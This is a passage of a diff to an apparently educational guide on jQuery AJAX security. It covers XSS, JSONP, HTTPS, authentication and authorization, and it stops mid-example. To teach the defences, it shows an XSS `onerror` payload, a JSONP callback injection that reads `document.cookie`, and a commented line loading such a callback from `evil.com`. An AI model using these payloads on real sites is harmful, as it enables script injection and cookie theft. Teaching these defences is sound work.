+XSS is when a bad actor manages to sneak malicious code into your web page. If your page inserts data from an untrusted source without checking it first, that code can run in your users' browsers. The simplest defense is to use `.text()` instead of `.html()` when displaying untrusted data.
 
 ### Purposes
 
-- To authenticate API requests without relying on cookies.
-- To enable stateless authentication (no server-side session storage).
-- To prevent CSRF by not sending credentials automatically.
-- To support cross-domain and mobile clients.
-- To carry user claims (roles, permissions) within the token.
+- To prevent malicious scripts from executing in users' browsers.
+- To protect session cookies, authentication tokens, and sensitive user data.
+- To maintain the integrity and trustworthiness of the web application.
 
 ### Syntax Rules and Structure
 
-**Complete General Syntax**
+**Vulnerable vs. Safe Syntax:**
+
+```javascript
+// ❌ VULNERABLE: .html() interprets HTML and executes scripts
+$("#output").html(untrustedData);
+
+// ✅ SAFE: .text() escapes HTML entities
+$("#output").text(untrustedData);
+
+// ✅ SAFE: Using .text() to escape, then .html() if HTML is needed
+$("#output").html($("<div>").text(untrustedData).html());
+
+// ❌ VULNERABLE: $.parseHTML() with untrusted input
+var html = $.parseHTML(untrustedData);
+$("#output").append(html);
+```
+
+**Component Breakdown:**
+
+| Method | Behavior | Safety |
+|--------|----------|--------|
+| `.html(data)` | Interprets data as HTML; executes scripts | Unsafe with untrusted data |
+| `.text(data)` | Escapes HTML entities; displays as text | Safe |
+| `.append(data)` | Interprets data as HTML | Unsafe with untrusted data |
+| `$.parseHTML(data)` | Parses HTML string | Unsafe with untrusted data |
+
+**Syntax Rules:**
+
+1. Always use `.text()` for untrusted data that should be displayed as text.
+2. If HTML rendering is required, sanitize the data first (e.g., with DOMPurify).
+3. Avoid `eval()`, `new Function()`, and `setTimeout(string, ...)` with untrusted data.
+4. Use a Content Security Policy (CSP) to restrict script sources.
+5. Server-side output encoding is the primary defense; client-side sanitization is a supplement.
+
+**Constraints and Limitations:**
+
+- `.text()` cannot render HTML; it displays tags as literal text.
+- Client-side sanitization libraries add overhead and must be kept up to date.
+- CSP is not supported in all browsers and requires server configuration.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: Preventing XSS with `.text()`**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Prevention with jQuery</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <div id="safeOutput"></div>
+    <div id="unsafeOutput"></div>
+
+    <script>
+        // Simulated untrusted data from a server or user input
+        var untrustedData = '<img src=x onerror=alert("XSS")>';
+
+        // ❌ UNSAFE: Using .html() executes the onerror handler
+        // $("#unsafeOutput").html(untrustedData);
+        // This would trigger an alert popup
+
+        // ✅ SAFE: Using .text() escapes the HTML
+        $("#safeOutput").text(untrustedData);
+        console.log("Safe output:", $("#safeOutput").text());
+        // Output: <img src=x onerror=alert("XSS")> (displayed as text)
+
+        // ✅ SAFE: Escaping with .text() then converting back to HTML
+        var escapedHtml = $("<div>").text(untrustedData).html();
+        console.log("Escaped HTML:", escapedHtml);
+        // Output: &lt;img src=x onerror=alert("XSS")&gt;
+    </script>
+</body>
+</html>
+```
+
+**Expected Output:**
+The `#safeOutput` div displays the literal text `<img src=x onerror=alert("XSS")>` without executing the alert. The `#unsafeOutput` div would trigger an alert if the commented code were uncommented.
+
+**Why This Code Produces That Result:**
+`.text()` treats the entire string as text content, escaping HTML entities. The `<` becomes `&lt;`, `>` becomes `&gt;`, and the `onerror` attribute is neutralized. The browser displays the characters without interpreting them as HTML. This is the simplest and most effective defense against DOM-based XSS.
+
+### Real-World Cases
+
+- **Comment Sections:** Displaying user-submitted comments safely.
+- **User Profiles:** Showing usernames, bios, and other user-generated content.
+- **Search Results:** Displaying search queries and results without executing injected scripts.
+- **AJAX-Loaded Content:** Inserting API responses into the DOM safely.
+
+---
+
+## 4. JSONP Security
+
+### Definitions
+
+**Core Definition:**
+JSONP (JSON with Padding) is a technique for cross-domain data fetching that uses `<script>` tag injection. Its security risks stem from the fact that the server can execute arbitrary JavaScript in the context of the requesting page.
+
+**Technical Definition:**
+JSONP works by wrapping JSON data in a function call specified by a `callback` query parameter. The browser loads the response as a script, which executes the callback function. If the callback parameter is not validated, an attacker can inject arbitrary JavaScript. A safe JSONP implementation must validate that the callback matches a legal JavaScript function name pattern (e.g., `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`). This is the standard mitigation used by jQuery, Express.js, and Google APIs. jQuery's `$.getJSON()` automatically attempts JSONP for some cross-origin requests, which can introduce XSS vulnerabilities if the URL is untrusted.
+
+**Beginner-Friendly Explanation:**
+JSONP was a way to get data from other websites before CORS existed. It works by loading a script from the other site. The danger is that if the other site is malicious, it can run any code it wants on your page. Modern applications should use CORS instead.
+
+### Purposes
+
+- To fetch data from a different domain when CORS is not available (legacy systems).
+- To consume third-party APIs that only support JSONP.
+- To understand the security risks of JSONP so it can be disabled or replaced.
+
+### Syntax Rules and Structure
+
+**Vulnerable JSONP Callback:**
+
+```
+// Attacker-controlled callback parameter
+GET /api/data?callback=alert(document.cookie)//
+
+// Server responds with:
+alert(document.cookie)//({"data": "value"});
+```
+
+**Safe JSONP Callback Validation (Server-Side):**
+
+```javascript
+// Validate the callback parameter against a legal function name pattern
+var callback = req.query.callback;
+if (!/^[a-zA-Z_$][a-zA-Z0-9_$.]*$/.test(callback)) {
+    return res.status(400).send("Invalid callback");
+}
+res.type("application/javascript");
+res.send(callback + "(" + JSON.stringify(data) + ");");
+```
+
+**Component Breakdown:**
+
+| Component | Description |
+|-----------|-------------|
+| `callback` | The query parameter specifying the function name. |
+| `^[a-zA-Z_$][a-zA-Z0-9_$.]*$` | The regex pattern for valid JavaScript identifiers. |
+| `JSON.stringify(data)` | Serializes data safely. |
+
+**Syntax Rules:**
+
+1. Always validate the callback parameter server-side.
+2. Only allow alphanumeric characters, underscores, dollar signs, and dots.
+3. Never reflect the raw callback parameter without validation.
+4. Prefer CORS over JSONP for cross-origin requests.
+5. Disable JSONP in jQuery if not needed: `$.ajaxSetup({ jsonp: false })`.
+
+**Constraints and Limitations:**
+
+- JSONP only supports GET requests.
+- No error handling for HTTP errors.
+- Content Security Policy (CSP) can block JSONP if `script-src` is restricted.
+- JSONP is deprecated in favor of CORS.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: Demonstrating JSONP Vulnerability and Safe Validation**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JSONP Security</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <div id="output"></div>
+
+    <script>
+        // ❌ VULNERABLE: Untrusted callback injection
+        // If an attacker controls the callback parameter, they can execute code
+        // var maliciousUrl = "https://evil.com/data?callback=alert(document.cookie)//";
+        // $.getJSON(maliciousUrl, function(data) { /* ... */ });
+
+        // ✅ SAFE: Disable JSONP for untrusted URLs
+        $.ajaxSetup({
+            jsonp: false // Disable automatic JSONP
+        });
+
+        // ✅ SAFE: Use CORS for cross-origin requests
+        $.ajax({
+            url: "https://api.example.com/data",
+            dataType: "json",
+            success: function(data) {
+                $("#output").text(JSON.stringify(data));
+            },
+            error: function(jqXHR, textStatus) {
+                $("#output").text("Request failed: " + textStatus);
+            }
+        });
+
+        // ✅ SAFE: If JSONP is necessary, validate the callback server-side
+        // The server must check that the callback matches
+        // /^[a-zA-Z_$][a-zA-Z0-9_$.]*$/ before reflecting it
+    </script>
+</body>
+</html>
+```
+
+**Expected Output:**
+The output div displays the JSON data or an error message. No malicious script executes because JSONP is disabled and CORS is used.
+
+**Why This Code Produces That Result:**
+Setting `$.ajaxSetup({ jsonp: false })` prevents jQuery from automatically using JSONP for cross-origin requests. The explicit `dataType: "json"` ensures the request uses CORS instead. If the server supports CORS, the request succeeds. If JSONP were used with an unvalidated callback, an attacker could inject arbitrary JavaScript.
+
+### Real-World Cases
+
+- **Legacy API Integration:** Some older APIs only support JSONP; validation is critical.
+- **Security Audits:** Identifying and replacing JSONP with CORS in modern applications.
+- **CSP Configuration:** Using `script-src` directives to block JSONP script injection.
+
+---
+
+## 5. HTTPS
+
+### Definitions
+
+**Core Definition:**
+HTTPS (HyperText Transfer Protocol Secure) is the encrypted version of HTTP, using TLS/SSL to protect the confidentiality and integrity of data exchanged between the client and server.
+
+**Technical Definition:**
+HTTPS encrypts all data (headers and body) transmitted between the browser and server, preventing man-in-the-middle (MITM) attacks, eavesdropping, and data tampering. For AJAX, all requests must use HTTPS URLs. Mixed content (loading HTTP resources on an HTTPS page) is blocked by modern browsers. Best practices include using TLS 1.2 or higher, strong cipher suites, secure cookies, and enforcing HTTPS everywhere.
+
+**Beginner-Friendly Explanation:**
+HTTPS is like sending your data in a locked box instead of a postcard. Nobody can read or change it while it's traveling between your browser and the server. If your page is loaded over HTTPS but makes an AJAX request to an HTTP URL, the browser will block it as "mixed content."
+
+### Purposes
+
+- To protect sensitive data (passwords, tokens, personal information) from eavesdropping.
+- To prevent man-in-the-middle attacks that could modify AJAX responses.
+- To ensure data integrity and authenticity.
+- To comply with modern browser security requirements (mixed content blocking).
+
+### Syntax Rules and Structure
+
+**Complete General Syntax:**
+
+```javascript
+// ✅ CORRECT: Use HTTPS for all AJAX requests
+$.ajax({
+    url: "https://api.example.com/data",
+    type: "GET",
+    success: function(data) { /* ... */ }
+});
+
+// ❌ INCORRECT: HTTP URL on an HTTPS page
+// $.ajax({ url: "http://api.example.com/data" });
+// This will be blocked as mixed content
+```
+
+**Component Breakdown:**
+
+| Component | Description |
+|-----------|-------------|
+| `https://` | The secure protocol prefix. |
+| TLS 1.2+ | The minimum recommended TLS version. |
+| Secure cookies | Cookies with the `Secure` attribute are only sent over HTTPS. |
+
+**Syntax Rules:**
+
+1. All AJAX URLs must use `https://` when the page is served over HTTPS.
+2. Mixed content (HTTP resources on HTTPS pages) is blocked by modern browsers.
+3. Cookies should have the `Secure` and `HttpOnly` attributes.
+4. Use protocol-relative URLs (`//api.example.com`) carefully; they inherit the page's protocol.
+5. Redirect HTTP to HTTPS server-side with HSTS (HTTP Strict Transport Security).
+
+**Constraints and Limitations:**
+
+- HTTPS adds slight latency due to TLS handshake.
+- Mixed content blocking cannot be bypassed by JavaScript.
+- Self-signed certificates cause browser warnings and should not be used in production.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: Ensuring HTTPS for AJAX Requests**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTTPS AJAX</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <div id="output"></div>
+
+    <script>
+        // Step 1: Check the page protocol
+        var pageProtocol = window.location.protocol;
+        console.log("Page protocol:", pageProtocol); // "https:"
+
+        // Step 2: Build the AJAX URL with the correct protocol
+        var apiUrl = "https://api.example.com/data";
+
+        // Step 3: Make the request
+        $.ajax({
+            url: apiUrl,
+            type: "GET",
+            dataType: "json"
+        })
+        .done(function(data) {
+            $("#output").text("Data loaded over HTTPS");
+        })
+        .fail(function(jqXHR, textStatus, errorThrown) {
+            if (jqXHR.status === 0) {
+                $("#output").text("Request blocked (mixed content?)");
+            } else {
+                $("#output").text("Error: " + textStatus);
+            }
+        });
+
+        // Step 4: Server-side: Force HTTPS with HSTS
+        // Response header: Strict-Transport-Security: max-age=31536000; includeSubDomains
+    </script>
+</body>
+</html>
+```
+
+**Expected Output:**
+The output div displays "Data loaded over HTTPS" if the request succeeds. If the page is HTTPS and the request is HTTP, the request is blocked and a mixed content error appears in the console.
+
+**Why This Code Produces That Result:**
+The `https://` protocol ensures the request is encrypted. If the page were loaded over HTTPS and the AJAX URL used HTTP, the browser would block the request as mixed content. The HSTS header instructs the browser to always use HTTPS for future requests to the domain.
+
+### Real-World Cases
+
+- **E-Commerce Checkout:** Protecting payment information during AJAX form submission.
+- **Authentication:** Sending login credentials over HTTPS.
+- **API Communication:** Ensuring all API calls are encrypted.
+- **Progressive Web Apps (PWAs):** HTTPS is required for service workers and many modern APIs.
+
+---
+
+## 6. Authentication
+
+### Definitions
+
+**Core Definition:**
+Authentication is the process of verifying the identity of a user or client making an AJAX request, ensuring that the request comes from a legitimate, known entity.
+
+**Technical Definition:**
+In AJAX, authentication is typically handled via HTTP headers. Common mechanisms include Basic Authentication (base64-encoded username:password in the `Authorization` header), Bearer tokens (e.g., JWT in the `Authorization: Bearer <token>` header), and session cookies. jQuery can add authentication headers using `$.ajaxSetup()` or the `beforeSend` callback. For cross-origin requests with credentials, `xhrFields: { withCredentials: true }` is required.
+
+**Beginner-Friendly Explanation:**
+Authentication is how the server knows who you are. When you make an AJAX request, you need to prove your identity — usually by including a special token or header. Without authentication, the server might reject your request or treat you as anonymous.
+
+### Purposes
+
+- To verify the identity of the user making the AJAX request.
+- To associate requests with a user session for personalized responses.
+- To prevent unauthorized access to protected resources.
+- To enable secure API consumption with token-based authentication.
+
+### Syntax Rules and Structure
+
+**Complete General Syntax:**
+
+```javascript
+// Basic Authentication
+$.ajax({
+    url: "/api/data",
+    type: "GET",
+    beforeSend: function(xhr) {
+        xhr.setRequestHeader("Authorization", "Basic " + btoa(username + ":" + password));
+    }
+});
+
+// Bearer Token Authentication
+$.ajax({
+    url: "/api/data",
+    type: "GET",
+    beforeSend: function(xhr) {
+        xhr.setRequestHeader("Authorization", "Bearer " + token);
+    }
+});
+
+// Global Authentication Setup
+$.ajaxSetup({
+    headers: {
+        "Authorization": "Bearer " + token
+    }
+});
+```
+
+**Component Breakdown:**
+
+| Component | Description |
+|-----------|-------------|
+| `Authorization` | The HTTP header carrying authentication credentials. |
+| `Basic` | Base64-encoded username:password. |
+| `Bearer` | A token (e.g., JWT) representing the user's session. |
+| `btoa()` | Encodes a string to base64. |
+
+**Syntax Rules:**
+
+1. Basic Authentication uses `btoa(username + ":" + password)`.
+2. Bearer tokens are sent as `Bearer <token>`.
+3. Use `beforeSend` or `$.ajaxSetup()` to add headers.
+4. Credentials should only be sent over HTTPS.
+5. For cross-origin requests, `withCredentials: true` is required for cookies.
+
+**Constraints and Limitations:**
+
+- Basic Authentication credentials are only base64-encoded, not encrypted; HTTPS is essential.
+- Tokens must be stored securely (e.g., in memory or secure cookies, not localStorage).
+- Tokens expire and must be refreshed.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: Bearer Token Authentication with jQuery**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AJAX Authentication</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <div id="output"></div>
+
+    <script>
+        // Step 1: Assume the token is obtained from a login endpoint
+        var authToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
+
+        // Step 2: Configure jQuery to include the token in all requests
+        $.ajaxSetup({
+            headers: {
+                "Authorization": "Bearer " + authToken
+            }
+        });
+
+        // Step 3: Make an authenticated request
+        $.ajax({
+            url: "https://api.example.com/protected",
+            type: "GET",
+            dataType: "json"
+        })
+        .done(function(data) {
+            $("#output").text("Authenticated: " + data.message);
+        })
+        .fail(function(jqXHR) {
+            if (jqXHR.status === 401) {
+                $("#output").text("Authentication failed: token expired or invalid");
+            } else {
+                $("#output").text("Error: " + jqXHR.status);
+            }
+        });
+
+        // Step 4: For login, send credentials over HTTPS
+        // $.ajax({
+        //     url: "https://api.example.com/login",
+        //     type: "POST",
+        //     data: { username: "user", password: "pass" },
+        //     success: function(response) {
+        //         authToken = response.token;
+        //         $.ajaxSetup({ headers: { "Authorization": "Bearer " + authToken } });
+        //     }
+        // });
+    </script>
+</body>
+</html>
+```
+
+**Expected Output:**
+The output div displays the protected resource if the token is valid. If the token is expired or invalid, a 401 error message is shown.
+
+**Why This Code Produces That Result:**
+The `$.ajaxSetup()` adds the `Authorization: Bearer <token>` header to every request. The server validates the token and returns the protected data. If the token is invalid, the server responds with 401 Unauthorized, and the `.fail()` handler displays an appropriate message.
+
+### Real-World Cases
+
+- **API Clients:** Authenticating with REST APIs using JWT or OAuth tokens.
+- **Single-Page Applications:** Managing user sessions with token-based authentication.
+- **Microservices:** Service-to-service authentication with bearer tokens.
+
+---
+
+## 7. Authorization
+
+### Definitions
+
+**Core Definition:**
+Authorization is the process of determining what actions or resources an authenticated user is permitted to access, enforced on the server for every AJAX request.
+
+**Technical Definition:**
+Authorization is distinct from authentication: authentication verifies identity, while authorization determines permissions. In AJAX, authorization must be enforced server-side; client-side checks can be bypassed. Even though you only expect your AJAX client-side code to call certain services, those services can be called directly by users. Authorization logic must therefore reside on the server, validating the user's role, permissions, or access level for each request.
+
+**Beginner-Friendly Explanation:**
+Authentication is "who are you?" Authorization is "what are you allowed to do?" Even if you're logged in, you might not have permission to delete other users' posts. The server must check your permissions every time you make a request.
+
+### Purposes
+
+- To ensure users can only access resources and perform actions they are permitted to.
+- To prevent privilege escalation and unauthorized data access.
+- To enforce business rules and access control policies on the server.
+
+### Syntax Rules and Structure
+
+**Server-Side Authorization (Conceptual):**
+
+```javascript
+// Server-side middleware (e.g., Express.js)
+function requireAdmin(req, res, next) {
+    if (!req.user || req.user.role !== "admin") {
+        return res.status(403).json({ error: "Forbidden" });
+    }
+    next();
+}
+
+app.delete("/api/users/:id", requireAdmin, function(req, res) {
+    // Only admins can delete users
+});
+```
+
+**Client-Side Handling:**
 
 ```javascript
 $.ajax({
-  url: "/api/protected",
-  type: "GET",
-  beforeSend: function(xhr) {
-    xhr.setRequestHeader("Authorization", "Bearer " + token);
-  }
+    url: "/api/users/123",
+    type: "DELETE",
+    success: function() {
+        console.log("User deleted");
+    },
+    error: function(jqXHR) {
+        if (jqXHR.status === 403) {
+            console.log("You do not have permission to delete this user");
+        }
+    }
 });
 ```
 
-**Component Breakdown**
+**Component Breakdown:**
 
-- **Token Storage**: `localStorage`, `sessionStorage`, or in-memory variable.
-- **Header Format**: `Authorization: Bearer <JWT>`.
-- **Token Structure**: `header.payload.signature` (Base64-encoded) .
+| Component | Description |
+|-----------|-------------|
+| `req.user.role` | The authenticated user's role (e.g., "admin", "user"). |
+| `403 Forbidden` | HTTP status code for authorization failure. |
+| Server middleware | Enforces authorization before processing the request. |
 
-**Syntax Rules**
+**Syntax Rules:**
 
-1. The `Authorization` header must be explicitly allowed in CORS `Access-Control-Allow-Headers` (wildcards do not apply) .
-2. Tokens should be stored in `localStorage` or memory, not cookies, to mitigate CSRF .
-3. `localStorage` is vulnerable to XSS; tokens can be stolen if XSS exists .
-4. The `beforeSend` function is the recommended way to attach tokens in jQuery .
+1. Authorization must be enforced server-side; never rely solely on client-side checks.
+2. Use HTTP 403 Forbidden for authorization failures (vs. 401 for authentication failures).
+3. Validate the user's role or permissions for every sensitive request.
+4. Apply the principle of least privilege: grant only the minimum permissions necessary.
 
-**Constraints and Limitations**
+**Constraints and Limitations:**
 
-- **XSS Vulnerability**: Tokens in `localStorage` can be stolen by XSS attacks .
-- **No Automatic Revocation**: JWTs cannot be revoked before expiry without server-side blocklists.
-- **Storage Trade-offs**: Cookies (HttpOnly) are safer from XSS but vulnerable to CSRF; `localStorage` is CSRF-resistant but XSS-vulnerable.
+- Client-side role checks are for UX only, not security.
+- Authorization logic must be maintained consistently across all endpoints.
+- Complex permission models require careful testing.
 
-### Multiple Annotated Complete Code Examples
+### Multiple Annotated Complete Step by Step Code Examples
 
-**Example 1: Attaching JWT Bearer Token**
+**Example 1: Server-Side Authorization for AJAX Requests**
 
 ```html
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Auth — JWT Bearer</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <title>AJAX Authorization</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 </head>
 <body>
-  <button id="loginBtn">Login (Simulated)</button>
-  <button id="fetchData">Fetch Protected Data</button>
-  <div id="output"></div>
+    <div id="output"></div>
 
-  <script>
-    $(function () {
-      // Simulated login: store token
-      $("#loginBtn").on("click", function () {
-        var fakeToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
-        localStorage.setItem("jwt_token", fakeToken);
-        $("#output").text("Logged in. Token stored.");
-      });
-
-      // Fetch protected data with token
-      $("#fetchData").on("click", function () {
-        var token = localStorage.getItem("jwt_token");
-
-        if (!token) {
-          $("#output").text("No token. Please login first.");
-          return;
-        }
-
-        // Step 1: Attach token in beforeSend
+    <script>
+        // Step 1: Attempt to delete a user (requires admin role)
         $.ajax({
-          url: "https://api.example.com/protected",
-          type: "GET",
-          dataType: "json",
-          beforeSend: function (xhr) {
-            xhr.setRequestHeader("Authorization", "Bearer " + token);
-          }
-        })
-        .done(function (data) {
-          $("#output").text("Protected data: " + JSON.stringify(data));
-        })
-        .fail(function (jqXHR) {
-          if (jqXHR.status === 401) {
-            $("#output").text("Unauthorized. Token may be expired.");
-            localStorage.removeItem("jwt_token");
-          } else {
-            $("#output").text("Error: " + jqXHR.statusText);
-          }
+            url: "/api/users/123",
+            type: "DELETE",
+            success: function() {
+                $("#output").text("User deleted successfully");
+            },
+            error: function(jqXHR, textStatus, errorThrown) {
+                // Step 2: Handle authorization failure
+                if (jqXHR.status === 403) {
+                    $("#output").text("Access denied: insufficient permissions");
+                } else if (jqXHR.status === 401) {
+                    $("#output").text("Authentication required");
+                } else {
+                    $("#output").text("Error: " + textStatus);
+                }
+            }
         });
-      });
-    });
-  </script>
+
+        // Step 3: Server-side pseudo-code for authorization
+        // app.delete("/api/users/:id", function(req, res) {
+        //     if (!req.user || req.user.role !== "admin") {
+        //         return res.status(403).json({ error: "Forbidden" });
+        //     }
+        //     // Delete the user
+        // });
+    </script>
 </body>
 </html>
 ```
 
-**Expected Output**
-- After "login," the token is stored.
-- "Fetch Protected Data" sends a request with `Authorization: Bearer <token>`.
-- If the token is valid, data is returned; if not, a 401 error is shown.
+**Expected Output:**
+If the user is an admin, the delete succeeds. If the user is not an admin, the server returns 403 and the output shows "Access denied: insufficient permissions."
 
-**Why This Output Occurs**
-The `beforeSend` callback attaches the token to the request header, allowing the server to authenticate the request .
-
----
-
-**Example 2: Using `headers` Option (jQuery 1.5+)**
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Auth — Headers Option</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-</head>
-<body>
-  <button id="callApi">Call API with Token</button>
-  <div id="output"></div>
-
-  <script>
-    $(function () {
-      var token = "your-jwt-token-here";
-
-      $("#callApi").on("click", function () {
-        // Alternative: use headers option directly
-        $.ajax({
-          url: "https://api.example.com/user/profile",
-          type: "GET",
-          headers: {
-            "Authorization": "Bearer " + token
-          },
-          dataType: "json"
-        })
-        .done(function (profile) {
-          $("#output").text("Welcome, " + profile.name);
-        })
-        .fail(function () {
-          $("#output").text("Authentication failed.");
-        });
-      });
-    });
-  </script>
-</body>
-</html>
-```
-
-**Expected Output**
-- The request includes the `Authorization` header.
-- The server validates the token and returns the user's profile.
-
-**Why This Output Occurs**
-The `headers` option is a declarative way to add custom headers to the request without using `beforeSend` .
+**Why This Code Produces That Result:**
+The server checks the user's role before processing the delete request. If the user lacks the admin role, the server responds with 403 Forbidden. The client-side error handler interprets the status code and displays an appropriate message. Client-side checks alone would be insufficient because an attacker could bypass them and call the API directly.
 
 ### Real-World Cases
 
-- **SPA Authentication**: Storing JWT in `localStorage` and attaching it to API calls.
-- **Mobile Apps**: Using Bearer tokens for API authentication.
-- **Microservices**: Service-to-service authentication with JWTs.
-- **Third-Party APIs**: Using OAuth 2.0 Bearer tokens (e.g., GitHub, Google).
-
-### References
-
-- Stack Overflow — Attaching Bearer Token in jQuery AJAX – https://stackoverflow.com/revisions/ea016f41-cd55-452c-b04d-72a0220e9d31/view-source
-- Stack Overflow — beforeSend for Bearer Token – https://stackoverflow.com/revisions/b1c35d36-12f7-4d14-8fbc-fb5bda59664a/view-source
-- Microsoft Learn — Token-Based Authentication – https://learn.microsoft.com/zh-cn/aspnet/core/security/anti-request-forgery
+- **Admin Panels:** Restricting access to administrative functions.
+- **Multi-Tenant Applications:** Ensuring users can only access their own organization's data.
+- **API Rate Limiting:** Enforcing usage quotas based on user role.
+- **Content Management:** Allowing only authors to edit their own articles.
 
 ---
 
-## Core Concept 5: Why Client-Side Handling Never Replaces Server-Side Validation
+## 8. AJAX Security Best Practices
 
 ### Definitions
 
-**Core Definition**
-Client-side validation (whether HTML5, jQuery, or JavaScript) improves user experience but provides no security guarantee because it runs in an environment the attacker fully controls.
+**Core Definition:**
+AJAX security best practices are empirically established guidelines for protecting jQuery AJAX requests from CSRF, XSS, JSONP injection, insecure transport, and authentication/authorization flaws, based on OWASP recommendations and industry standards.
 
-**Technical Definition**
-Any code executed in the user's browser can be inspected, modified, or bypassed entirely . An attacker can disable JavaScript, use browser developer tools to alter validation logic, or send crafted HTTP requests directly to the server using tools like `curl` or Postman . Therefore, all security-relevant validation—input sanitization, authentication, authorization, and business rule enforcement—must be duplicated and enforced on the server. Client-side validation is for user convenience (immediate feedback) and reducing unnecessary server load .
+**Technical Definition:**
+Best practices encompass: using CSRF tokens for state-changing requests; enforcing CORS with explicit origins; preventing XSS by using `.text()` over `.html()` for untrusted data; avoiding JSONP unless the callback is strictly validated; enforcing HTTPS with HSTS; implementing token-based authentication over HTTPS; enforcing server-side authorization; upgrading jQuery to the latest version; applying Content Security Policy; and validating all input server-side.
 
-**Beginner-Friendly Explanation**
-Think of client-side validation as a friendly usher at a theater who checks tickets at the door. But an attacker can walk around the usher, climb through a window, or forge a ticket. The real security guard is the server, which checks every ticket again before letting anyone in.
+**Beginner-Friendly Explanation:**
+These are the proven tips that security experts recommend when working with AJAX. Following them helps protect your users' data and keeps your application safe from common attacks.
 
 ### Purposes
 
-- To ensure data integrity regardless of client behaviour.
-- To prevent attackers from bypassing security checks.
-- To enforce business rules authoritatively.
-- To comply with security standards (OWASP, PCI DSS, HIPAA).
-- To protect against injection attacks (SQL, XSS, command injection).
+- To prevent common AJAX-related vulnerabilities (CSRF, XSS, JSONP injection).
+- To ensure secure communication between client and server.
+- To protect user data and maintain application integrity.
+- To comply with security standards and regulations.
 
 ### Syntax Rules and Structure
 
-**Validation Responsibility Matrix**
+**Key Best Practices:**
 
-| Validation Type | Client-Side | Server-Side |
-|---|---|---|
-| Required fields | Yes (UX) | **Required (Security)** |
-| Email format | Yes (UX) | **Required (Security)** |
-| Password strength | Yes (UX) | **Required (Security)** |
-| SQL injection prevention | No | **Required (Security)** |
-| XSS prevention | No | **Required (Security)** |
-| Authentication | No | **Required (Security)** |
-| Authorization | No | **Required (Security)** |
-| Business rules | No | **Required (Security)** |
+| # | Practice | Bad Example | Good Example |
+|---|----------|-------------|--------------|
+| 1 | Use CSRF tokens for state-changing requests | No token in POST | `X-CSRF-Token` header |
+| 2 | Use `.text()` instead of `.html()` for untrusted data | `.html(userInput)` | `.text(userInput)` |
+| 3 | Enforce CORS with explicit origins | `Access-Control-Allow-Origin: *` with credentials | Specific origin |
+| 4 | Avoid JSONP unless callback is validated | Unvalidated callback | Regex validation server-side |
+| 5 | Use HTTPS for all AJAX requests | `http://api.example.com` | `https://api.example.com` |
+| 6 | Use token-based authentication over HTTPS | Basic auth over HTTP | Bearer token over HTTPS |
+| 7 | Enforce server-side authorization | Client-only role checks | Server middleware |
+| 8 | Upgrade jQuery to the latest version | jQuery 1.x/2.x | jQuery 3.7+ |
+| 9 | Apply Content Security Policy | No CSP header | `script-src 'self'` |
+| 10 | Validate all input server-side | Client-only validation | Server-side validation |
 
-**Syntax Rules**
+**Syntax Rules:**
 
-1. **Never trust any data from the client** .
-2. Validate all input on the server, even if validated client-side.
-3. Use parameterized queries or ORMs to prevent SQL injection.
-4. Encode output to prevent XSS.
-5. Perform authorization checks on every request, not just at the UI level.
+1. Always include a CSRF token in non-safe AJAX requests (POST, PUT, DELETE, PATCH).
+2. Use `.text()` for untrusted data; sanitize before using `.html()`.
+3. Configure CORS with specific origins when credentials are involved.
+4. Validate JSONP callbacks server-side against `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`.
+5. Use HTTPS with TLS 1.2+ and secure cookies.
+6. Upgrade jQuery to 3.0+ to avoid known CVEs.
+7. Never rely on client-side validation for security.
 
-**Constraints and Limitations**
+**Constraints and Limitations:**
 
-- **Performance**: Server-side validation adds latency; client-side validation reduces unnecessary requests.
-- **Duplicate Logic**: Validation rules must be maintained in two places.
-- **Complexity**: Server-side validation requires more development effort.
+- Security is a layered defense; no single measure is sufficient.
+- CSP and HSTS require server-side configuration.
+- Some legacy systems cannot be upgraded to modern security standards.
 
-### Multiple Annotated Complete Code Examples
+### Multiple Annotated Complete Step by Step Code Examples
 
-**Example 1: Client-Side Validation Bypass Demonstration**
+**Example 1: Applying Multiple AJAX Security Best Practices**
 
 ```html
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Validation — Bypass Demo</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <title>AJAX Security Best Practices</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <meta name="csrf-token" content="abc123def456ghi789">
 </head>
 <body>
-  <form id="secureForm" action="/api/submit" method="POST">
-    <input type="text" id="age" name="age" placeholder="Age (must be 18+)">
-    <button type="submit">Submit</button>
-  </form>
-  <p id="message"></p>
+    <div id="output"></div>
 
-  <script>
-    $(function () {
-      // Client-side validation: age must be >= 18
-      $("#secureForm").on("submit", function (event) {
-        var age = parseInt($("#age").val(), 10);
+    <script>
+        // ✅ BEST PRACTICE 1: Retrieve CSRF token
+        var csrfToken = $('meta[name="csrf-token"]').attr('content');
 
-        if (isNaN(age) || age < 18) {
-          event.preventDefault();
-          $("#message").text("You must be 18 or older.");
-        } else {
-          $("#message").text("Client-side validation passed.");
-          // Form submits to server
